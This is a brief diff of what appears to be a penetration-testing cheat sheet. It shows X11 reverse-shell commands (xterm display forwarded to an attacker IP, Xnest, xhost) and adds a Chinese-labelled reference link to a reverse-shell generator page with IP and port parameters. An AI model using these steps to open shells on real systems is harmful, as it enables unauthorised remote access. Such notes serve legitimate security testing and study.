@@ -425,3 +425,6 @@ xterm -display 10.10.10.11:1
 Xnest :1
 xhost +targetip
 ```
+
+参考链接：
+https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&port=443
